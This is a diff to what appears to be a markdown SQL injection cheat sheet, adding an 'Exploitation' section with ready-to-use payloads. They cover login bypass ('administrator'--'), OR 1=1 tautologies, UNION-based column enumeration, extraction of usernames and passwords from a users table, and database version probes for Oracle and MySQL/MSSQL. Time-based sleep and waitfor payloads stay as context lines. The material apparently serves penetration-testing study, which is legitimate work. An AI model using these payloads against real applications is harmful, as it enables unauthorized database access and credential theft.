@@ -15,11 +15,22 @@
       - ```id=1' and sleep(5)--```
       - ```id=';waitfor delay '0:0:5'--```
 
-## Payloads
-```
-a' or 1=1--
-a'or'1'='1
+## Exploitation
+- Login Bypass
+  - Username : ```administrator'--```
+- Where cluase : ```'+OR+1=1--``` 
+- UNION attack
+  - determining the number of columns : ```' UNION SELECT NULL--``` , ```' UNION SELECT NULL,NULL--``` , ...
+  - finding a column containing text : ```' UNION SELECT 'abcdef',NULL,NULL--``` , ```' UNION SELECT NULL,'abcdef',NULL--``` , ...
+  - retrive data from other tables : ```' UNION SELECT username,password FROM users--```
+  - retrive multiple values in a single columns : ```' UNION SELECT NULL,username||'~'||password FROM users--```
+  - querying the database type and version
+    - Oracle : ```' UNION SELECT BANNER,NULL FROM v$version--```
+    - MYSQL & MSSQL : ```' UNION SELECT @@version, NULL#```  (must use Burp because of #)
+  -  
 
+
+a'or'1'='1
 a' or '1'='1
 a' or '1'='1'--
 a' or '1'='1'#
